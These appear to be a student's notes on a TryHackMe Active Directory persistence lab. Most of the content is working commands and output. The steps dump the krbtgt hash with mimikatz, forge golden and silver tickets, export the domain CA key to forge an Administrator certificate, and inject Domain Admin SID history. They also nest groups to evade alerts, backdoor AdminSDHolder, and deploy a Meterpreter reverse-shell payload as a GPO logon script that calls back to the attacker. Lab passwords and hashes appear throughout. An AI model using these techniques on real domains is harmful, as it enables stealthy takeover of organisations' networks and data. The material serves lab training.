+++
title = "Persisting Active Directory"
+++
# https://tryhackme.com/room/persistingad

## 🚩 Access

```bash
# NEED TO DOWNLOAD .OVPN FILE BECAUSE IT BUGS FOR SOME REASON! and transfer it to VM/Attack Box

# Configure network access
sed -i '1s|^|nameserver 10.200.73.101\n|' /etc/resolv-dnsmasq
sudo systemctl restart NetworkManager

nslookup THMSERVER1.za.tryhackme.loc
nslookup THMDC.za.tryhackme.loc

---

sudo apt install -y sshpass

# Get AD creds
https://distributor.za.tryhackme.loc/creds
// Username: chloe.potter Password: Marisa2014

sshpass -p 'Marisa2014' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 ZA\\chloe.potter@thmwrk1.za.tryhackme.loc

Username: ZA\\Administrator
Password: tryhackmewouldnotguess1@

sshpass -p 'tryhackmewouldnotguess1@' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 ZA\\Administrator@thmwrk1.za.tryhackme.loc
```

#### CREDS

```

C:\Tools\mimikatz_trunk\x64\mimikatz.exe
lsadump::dcsync /domain:za.tryhackme.loc /user:chloe.potter

lsadump::dcsync /domain:za.tryhackme.loc /user:ZA\krbtgt
// 16f9af38fca3ada405386b3b57366082

```

#### TICKETS

```

get-addomain

AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=za,DC=tryhackme,DC=loc
DeletedObjectsContainer            : CN=Deleted Objects,DC=za,DC=tryhackme,DC=loc
DistinguishedName                  : DC=za,DC=tryhackme,DC=loc
DNSRoot                            : za.tryhackme.loc
DomainControllersContainer         : OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc
DomainMode                         : Windows2012R2Domain
DomainSID                          : S-1-5-21-3885271727-2693558621-2658995185
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=za,DC=tryhackme,DC=loc
Forest                             : tryhackme.loc
InfrastructureMaster               : THMDC.za.tryhackme.loc
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=za,DC=tryhackme,DC=loc}
LostAndFoundContainer              : CN=LostAndFound,DC=za,DC=tryhackme,DC=loc
ManagedBy                          :
Name                               : za
NetBIOSName                        : ZA
ObjectClass                        : domainDNS
ObjectGUID                         : 1fc9e299-da51-4d03-baa0-862c3360c0b2
ParentDomain                       : tryhackme.loc
PDCEmulator                        : THMDC.za.tryhackme.loc
PublicKeyRequiredPasswordRolling   :
QuotasContainer                    : CN=NTDS Quotas,DC=za,DC=tryhackme,DC=loc
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {THMDC.za.tryhackme.loc}
RIDMaster                          : THMDC.za.tryhackme.loc
SubordinateReferences              : {DC=DomainDnsZones,DC=za,DC=tryhackme,DC=loc}
SystemsContainer                   : CN=System,DC=za,DC=tryhackme,DC=loc
UsersContainer                     : CN=Users,DC=za,DC=tryhackme,DC=loc

# GOLDEN TICKET
kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt
// Golden ticket for 'ReallyNotALegitAccount @ za.tryhackme.loc' successfully submitted for current session 

# SILVER TICKET
kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:THMSERVER2 /rc4:4b091b72ce2eefece6494ee0f1bb874a /service:cifs /ptt
```

#### CERTIFICATES

- A quick note here. The techniques discussed from this point forward are incredibly invasive and hard to remove. Even if you have signoff on your red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make sure you fully understand the consequences of using these techniques and only perform them if you have prior approval on your assessment and they are deemed necessary. In most cases, a red team exercise would be dechained at this point instead of using these techniques. Meaning you would most likely not perform these persistence techniques but rather simulate them.
- We can continue requesting TGTs no matter how many rotations they do on the account we are attacking. The only way we can be kicked out is if they revoke the certificate we generated or if it expires. Meaning we probably have persistent access by default for roughly the next 5 years.
    - Certificate Authority (CA) itself
- 

```bash
crypto::certificates /systemstore:local_machine

 0.
    Subject  :
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA 
    Serial   : 040000000000703a4d78090a0ab10400000010      
    Algorithm: 1.2.840.113549.1.1.1 (RSA)
    Validity : 4/27/2022 7:32:43 PM -> 4/27/2023 7:32:43 PM
    Hash SHA1: d6a84e153fa326554f095be4255460d5a6ce2b39
        Key Container  : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 
        Provider       : Microsoft RSA SChannel Cryptographic Provider
        Provider type  : RSA_SCHANNEL (12)
        Type           : AT_KEYEXCHANGE (0x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-DomainControllerAuthentication-5ed52c94-34e8-4450-a751-a57ac55a110f 
        |Unique name   : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1  
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; ) 
        Exportable key : NO

 1. za-THMDC-CA
    Subject  : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : 90e157dae304ef429824a33d3a3ef91e
    Algorithm: 1.2.840.113549.1.1.1 (RSA)
    Validity : 4/27/2022 6:58:15 PM -> 4/27/2027 7:08:09 PM 
    Hash SHA1: c12fcb4b88467854b3d4d7f762adb50b0fd8346e
        Key Container  : za-THMDC-CA
        Provider       : Microsoft Software Key Storage Provider
        Provider type  : cng (0)
        Type           : CNG Key (0xffffffff)
        |Provider name : Microsoft Software Key Storage Provider 
        |Implementation: NCRYPT_IMPL_SOFTWARE_FLAG ;
        Key Container  : za-THMDC-CA
        Unique name    : 8d666f3049de45dee20c70510f66d2cf_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        Algorithm      : RSA 
        Key size       : 2048 (0x00000800)
        Export policy  : 00000003 ( NCRYPT_ALLOW_EXPORT_FLAG ; NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG ; )
        Exportable key : YES
        LSA isolation  : NO

 2. THMDC.za.tryhackme.loc
    Subject  : CN=THMDC.za.tryhackme.loc 
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : 03000000000057c6f9be06e7c78d0300000010
    Algorithm: 1.2.840.113549.1.1.1 (RSA)
    Validity : 4/27/2022 7:32:43 PM -> 4/27/2023 7:32:43 PM 
    Hash SHA1: a0e69ecef166b2d785a1b7d615ff730819443d42
        Key Container  : 520b5ca0aec81961ad476939c6792c13_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        Provider       : Microsoft RSA SChannel Cryptographic Provider
        Provider type  : RSA_SCHANNEL (12) 
        Type           : AT_KEYEXCHANGE (0x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-DomainController-ccb1e691-6606-40a3-a87a-f549bdcd757c
        |Unique name   : 520b5ca0aec81961ad476939c6792c13_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; ) 
        Exportable key : NO

 3.
    Subject  :
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : 02000000000078856466521a82570200000010
    Algorithm: 1.2.840.113549.1.1.1 (RSA)
    Validity : 4/27/2022 7:32:18 PM -> 4/27/2023 7:32:18 PM 
    Hash SHA1: 0d43237c50ccb446a07572545b5b4c8cf517682a
        Key Container  : 544fc312c893025e32795e06e74c4517_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        Provider       : Microsoft RSA SChannel Cryptographic Provider 
        Provider type  : RSA_SCHANNEL (12)
        Type           : AT_KEYEXCHANGE (0x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-KerberosAuthentication-21e4d1ee-54f7-4ca5-b36b-b2cecff9a609 
        |Unique name   : 544fc312c893025e32795e06e74c4517_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; ) 
        Exportable key : NO
// not exportable... normally

# NEED to patch services
privilege::debug
crypto::capi
crypto::cng

# NOW export certs
crypto::certificates /systemstore:local_machine /export
// The za-THMDC-CA.pfx certificate is the one we are particularly interested in. In order to export the private key, a password must be used to encrypt the certificate. By default, Mimikatz assigns the password of "mimikatz"

02/12/2026  06:06 PM             1,423 local_machine_My_0_.der
02/12/2026  06:06 PM             3,299 local_machine_My_0_.pfx
02/12/2026  06:06 PM               939 local_machine_My_1_za-THMDC-CA.der
02/12/2026  06:06 PM             2,685 local_machine_My_1_za-THMDC-CA.pfx
02/12/2026  06:06 PM             1,534 local_machine_My_2_THMDC.za.tryhackme.loc.der 
02/12/2026  06:06 PM             3,380 local_machine_My_2_THMDC.za.tryhackme.loc.pfx 
02/12/2026  06:06 PM             1,465 local_machine_My_3_.der
02/12/2026  06:06 PM             3,321 local_machine_My_3_.pfx

# Forge Cert with exported CAs
C:\Tools\ForgeCert\ForgeCert\ForgeCert.exe --CaCertPath local_machine_My_1_za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123

CA Certificate Information:
  Subject:        CN=za-THMDC-CA, DC=za, DC=tryhackme, DC=loc
  Issuer:         CN=za-THMDC-CA, DC=za, DC=tryhackme, DC=loc
  Start Date:     4/27/2022 7:58:15 PM
  End Date:       4/27/2027 8:08:09 PM
  Thumbprint:     C12FCB4B88467854B3D4D7F762ADB50B0FD8346E
  Serial:         1EF93E3A3DA3249842EF04E3DA57E190

Forged Certificate Information:
  Subject:        CN=User
  SubjectAltName: Administrator@za.tryhackme.loc
  Issuer:         CN=za-THMDC-CA, DC=za, DC=tryhackme, DC=loc
  Start Date:     2/12/2026 6:08:26 PM
  End Date:       2/12/2027 6:08:26 PM
  Thumbprint:     ECA4CAE26B6C937BC64779A90CBEE6E924600F9F
  Serial:         008988F4AFED42F30927C841F85120BE3D

Done. Saved forged certificate to fullAdmin.pfx with the password 'Password123'

# Request TGS
C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:<name of file to write TGT to> /domain:za.tryhackme.loc /dc:<IP of domain controller>

# Use TGS
mimikatz.exe
kerberos::ptt administrator.kirbi
exit
dir \\<DC>\c$\
```

After this...
WHY we Are No Longer Friends With The Blue Team

Certificate persistence is significantly harder to defend against. Even if you rotate the credentials of the compromised account, the certificate will still be valid. The only way to remove the persistence is to issue a revocation of the certificate. However, this would only be possible if we generated the certificate through legitimate channels. Since we exported the CA and generated the certificate ourselves, it does not appear on AD CS's list of issued certificates, meaning the blue team will not be able to revoke our certificate.

So what's the only solution to remove the persistence? Well, this is why we are no longer friends. They will have to revoke the root CA certificate. But revoking this certificate means that all certificates issued by AD CS would all of a sudden be invalid. Meaning they will have to generate a new certificate for every system that uses AD CS. You should start to see why this type of persistence is incredibly dangerous and would require full rebuilds of systems if performed.

---

#### SID History

- We normally require Domain Admin privileges or the equivalent thereof to perform this attack.  
    
- When the account creates a logon event, the SIDs associated with the account are added to the user's token, which then determines the privileges associated with the account. This includes group SIDs.
- We can take this attack a step further if we inject the Enterprise Admin SID since this would elevate the account's privileges to effective be Domain Admin in all domains in the forest.
- Since the SIDs are added to the user's token, privileges would be respected even if the account is not a member of the actual group. Making this a very sneaky method of persistence. We have all the permissions we need to compromise the entire domain (perhaps the entire forest), but our account can simply be a normal user account with membership only to the Domain Users group. We can up the sneakiness to another level by always using this account to alter the SID history of another account, so the initial persistence vector is not as easily discovered and remedied.

```bash
Get-ADUser chloe.potter -properties sidhistory,memberof

DistinguishedName : CN=chloe.potter,OU=Finance,OU=People,DC=za,DC=tryhackme,DC=loc
Enabled           : True
GivenName         : Chloe
MemberOf          : {CN=Internet Access,OU=Groups,DC=za,DC=tryhackme,DC=loc}
Name              : chloe.potter
ObjectClass       : user
ObjectGUID        : 7a0d1b55-c584-40a9-85bf-7a83d964c36a
SamAccountName    : chloe.potter
SID               : S-1-5-21-3885271727-2693558621-2658995185-1119
SIDHistory        : {}
Surname           : Potter
UserPrincipalName :
// look at empty history:   SIDHistory        : {}

Get-ADGroup "Domain Admins"

DistinguishedName : CN=Domain Admins,CN=Users,DC=za,DC=tryhackme,DC=loc
GroupCategory     : Security
GroupScope        : Global
Name              : Domain Admins
ObjectClass       : group
ObjectGUID        : 3a8e1409-c578-45d1-9bb7-e15138f1a922
SamAccountName    : Domain Admins
SID               : S-1-5-21-3885271727-2693558621-2658995185-512

# Add SIDhistory of normal user of "Domain Admins group"
# https://github.com/MichaelGrafnetter/DSInternals
Stop-Service -Name ntds -force 
Add-ADDBSidHistory -SamAccountName 'chloe.potter' -SidHistory 'S-1-5-21-3885271727-2693558621-2658995185-512' -DatabasePath C:\Windows\NTDS\ntds.dit 
Start-Service -Name ntds 

# Verify again with
Get-ADUser chloe.potter -properties sidhistory,memberof
```

If you were to RDP into one of the hosts and use the AD Users and Groups snap-in, you would be able to view the SID history attribute added to your user. However, even with the highest possible privileges, you would not be able to remove the attribute since it is protected. In order to remove this, you would have to use tools such as the AD-RSAT PowerShell cmdlets to remove SID history.

However, before you can even think about removing malicious SID history attributes, you first need to find them. None of the regular tools will tell you that something is wrong. That user will not all of a sudden pop up as a member of the Domain Admins group. So unless you are actively filtering through the attributes of your users, this is incredibly hard to find. This is because the SID history is only applied and used once the user authenticates.

Imagine that you are the blue team dealing with an incident where you have just performed a domain takeback. You rotated the krbtgt account's password twice, removed golden and silver tickets, and rebuilt your entire CA server from scratch, just to see that the attacker is still performing DA commands with a low-privileged account. This would not be a great day.

---

#### GROUP MEMBERSHIP

As discussed in task 1, the most privileged account, or group, is not always the best to use for persistence. Privileged groups are monitored more closely for changes than others. Any group that classifies as a protected group, such as Domain Admins or Enterprise Admins, receive additional security scrutiny. So if we want to persist through group membership, we may need to get creative regarding the groups we add our own accounts to for persistence:

- The IT Support group can be used to gain privileges such as force changing user passwords. Although, in most cases, we won't be able to reset the passwords of privileged users, having the ability to reset even low-privileged users can allow us to spread to workstations.
- Groups that provide local administrator rights are often not monitored as closely as protected groups. With local administrator rights to the correct hosts through group membership of a network support group, we may have good persistence that can be used to compromise the domain again.
- It is not always about direct privileges. Sometimes groups with indirect privileges, such as ownership over Group Policy Objects (GPOs), can be just as good for persistence.

For instance, we have an alert that fires off when a new member is added to the Domain Admins group. That is a good alert to have, but it won't fire off if a user is added to a subgroup within the Domain Admins group. This is a very common problem since AD is managed by the AD team, and alerting and monitoring are managed by the InfoSec team. All we need is a little bit of miscommunication, and the alert is no longer valid since subgroups are used.

```bash
# Create subgroups to hide under
New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "chloe.potter Net Group 1" -SamAccountName "chloe.potter_nestgroup1" -DisplayName "chloe.potter Nest Group 1" -GroupScope Global -GroupCategory Security

New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "chloe.potter Net Group 2" -SamAccountName "chloe.potter_nestgroup2" -DisplayName "chloe.potter Nest Group 2" -GroupScope Global -GroupCategory Security 
Add-ADGroupMember -Identity "chloe.potter_nestgroup2" -Members "chloe.potter_nestgroup1"

Add-ADGroupMember -Identity "Domain Admins" -Members "chloe.potter_nestgroup2"
```

If this was a real organisation, we would not be creating new groups to nest. Instead, we would make use of the existing groups to perform nesting. However, this is something you would never do on a normal red team assessment and almost always dechain at this point since it breaks the organisation's AD structure, and if we sufficiently break it, they would not be able to recover. At this point, even if the blue team was able to kick us out, the organisation would more than likely still have to rebuild their entire AD structure from scratch, resulting in significant damages.

---

#### AD Group Templates

AdminSDHolder container. This container exists in every AD domain, and its Access Control List (ACL) is used as a template to copy permissions to all protected groups. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins.
- https://docs.microsoft.com/en-us/previous-versions/technet-magazine/ee361593(v=msdn.10)
A process called SDProp takes the ACL of the AdminSDHolder container and applies it to all protected groups every 60 minutes. We can thus write an ACE that will grant us full permissions on all protected groups. If the blue team is not aware that this type of persistence is being used, it will be quite frustrating. Every time they remove the inappropriate permission on the protected object or group, it reappears within the hour. Since this reconstruction occurs through normal AD processes, it would also not show any alert to the blue team, making it harder to pinpoint the source of the persistence.


```bash
xfreerdp +multitransport /clipboard /dynamic-resolution /cert:ignore /v:THMWRK1.za.tryhackme.loc /u:chloe.potter /p:'Marisa2014' /drive:'.',share

runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe
// tryhackmewouldnotguess1@

mmc.exe

# add the Users and Groups Snap-in (File->Add Snap-In->Active Directory Users and Computers).
# Make sure to enable Advanced Features (Select Domain -> Action/More Actions -> View ->Advanced Features) to make "System appear"
Domain -> System -> AdminSDHolder
Right-Click AdminSDHolder -> Properties -> Security

Add our low-privileged user and grant Full Control:
1. Click **Add**.
2. Search for your low-privileged username and click **Check Names**.
3. Click **OK**.
4. Click **Allow** on **Full Control**.
5. Click **Apply**.
6. Click **OK**.

# Wait for SDProp for ~60mins (or force sync)
# on DC
powershell
cd C:\Tools
Import-Module .\Invoke-ADSDPropagation.ps1 
Invoke-ADSDPropagation

# Verify after sync...
Domain -> Users -> Domain Admins
Right-Click Domain Admins -> Properties -> Security
// the added user should now appear and will be persistent
```

Imagine combining this with the nesting groups of the previous task. Just as the blue team finished revoking your access through numerous group changes, 60 minutes later, you can just do it all again. Unless the blue team understands that the permissions are being altered through the AdminSDHolder group, they would be scratching their heads every 60 minutes. Since the persistence propagates through a legitimate AD service, they would most likely be none the wiser every time it happens. If you really want to persist, you can grant full control to the Domain Users group in the AdminSDHolder group, which means any low-privileged user would be granted full control over all Protected Groups. Combining this with a full DC Sync means the blue team will have to reset every single credential in the domain to flush us out completely.

---

#### GPOs

- Restricted Group Membership - This could allow us administrative access to all hosts in the domain
- Logon Script Deployment - This will ensure that we get a shell callback every time a user authenticates to a host in the domain.

There are many different hooks that can be deployed. You can play around with GPOs to learn about other hooks. Since we already used the first hook, Restricted Group Membership, in the Exploiting AD room. Let's now focus on the second hook. While having access to all hosts are nice, it can be even better by ensuring we get access to them when administrators are actively working on them. To do this, we will create a GPO that is linked to the Admins OU, which will allow us to get a shell on a host every time one of them authenticates to a host.

```bash
# Create script to run via GPO
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > chloe.potter_shell.exe

# CREATE chloe.potter_script.bat on the AttackBox:
copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\chloe.potter_shell.exe C:\tmp\chloe.potter_shell.exe && timeout /t 20 && C:\tmp\chloe.potter_shell.exe

# Copy over to DC
scp chloe.potter_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
scp chloe.potter_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/

# Start listener
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit"

---

xfreerdp +multitransport /clipboard /dynamic-resolution /cert:ignore /v:THMWRK1.za.tryhackme.loc /u:chloe.potter /p:'Marisa2014' /drive:'.',share

runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe
// tryhackmewouldnotguess1@

# Create GPO
1. In your runas-spawned terminal, run mmc.exe
2. Click on **File**->**Add/Remove Snap-in...**
3. Select the **Group Policy Management** snap-in and click **Add**
4. Click **OK**

We will write a GPO that will be applied to all Admins, so right-click on the Admins OU and select Create a GPO in this domain, and Link it here. Give your GPO a name such as `username - persisting GPO`

Right-click on your policy and select Enforced. This will ensure that your policy will apply, even if there is a conflicting policy. This can help to ensure our GPO takes precedence, even if the blue team has written a policy that will remove our changes. Now you can right-click on your policy and select edit:

Go back to our Group Policy Management Editor:  
1. Under User Configuration, expand **Policies->Windows Settings**.
2. Select **Scripts (Logon/Logoff)**.
3. Right-click on **Logon->Properties**
4. Select the **Scripts** tab.
5. Click **Add->Browse**.
Select your Batch file as the script and click Open and OK. Click Apply and OK. This will now ensure that every time one of the administrators (tier 2, 1, and 0) logs into any machine, we will get a callback. 

Hiding in Plain Sight  

Now that we know that our persistence is working, it is time to make sure the blue team can't simply remove our persistence. Go back to your MMC windows, click on your policy and then click on Delegation:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/744c4e6a1dd0a5aef63680cc7cf53120.png)  

By default, all administrators have the ability to edit GPOs. Let's remove these permissions:

1. **Right-Click** on **ENTERPRISE DOMAIN CONTROLLERS** and select **Edit settings, delete, modify security**.
2. **Click** on all other groups (except Authenticated Users) and click **Remove**.

You should be left with delegation.

Click on Advanced and remove the Created Owner from the permissions:
By default, all authenticated Users must have the ability to read the policy. This is required because otherwise, the policy could not be read by the user's account when they authenticate to apply User policies. If we did not have our logon script, we could also remove this permission to make sure that almost no one would be able to read our Policy.

We could replace Authenticated Users with Domain Computers to ensure that computers can still read and apply the policy, but prevent any user from reading the policy. Let's do this to test, but remember this can result in you not getting a shell callback upon authentication since the user will not be able to read the PowerShell script, so make sure to test your shell before performing these steps. **There is no going back after this:**

1. Click **Add**.
2. Type **Domain Computers**, click **Check Names** and then **OK**.
3. Select **Read permissions** and click **OK**.
4. Click on **Authenticated Users** and click **Remove**.
```

Additional Persistence Techniques  

In this network, we covered several techniques that can be used to persist in AD. This is by no means an exhaustive list. Here is a list of persistence techniques that also deserve mention:

- **[Skeleton keys](https://stealthbits.com/blog/unlocking-all-the-doors-to-active-directory-with-the-skeleton-key-attack/) -** Using Mimikatz, we can deploy a skeleton key. Mimikatz created a default password that will work for any account in the domain. Normal passwords will still work, making it hard to know that this attack has taken place. This default password can be used to impersonate any account in the domain.  
    
- **[Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714) -** Domain controllers have an internal break glass administrator account called the DSRM account. This password is set when the server is promoted to a DC and is seldom changed. This password is used in cases of emergencies to recover the DC. An attacker can extract this password using Mimikatz and use this password to gain persistent administrative access to domain controllers in the environment.  
    
- **[Malicious Security Support Provider (SSP)](https://adsecurity.org/?p=1760) -** Exploiting the SSP interface, it is possible to add new SSPs. We can add Mimikatz's mimilib as an SSP that would log all credentials of authentication attempts to a file. We can specify a network location for logging, which would allow mimilib to send us credentials as users authenticate to the compromised host, providing persistence.  
    
- **[Computer Accounts](https://adsecurity.org/?p=2753)** **-** The passwords for machine accounts are normally rotated every 30 days. However, we can alter the password of a machine account which would stop the automatic rotation. Together with this, we can grant the machine account administrative access to other machines. This will allow us to use the computer account as a normal account, with the only sign of the persistence being the fact that the account has administrative rights over other hosts, which is often normal behaviour in AD, so that it may go undetected.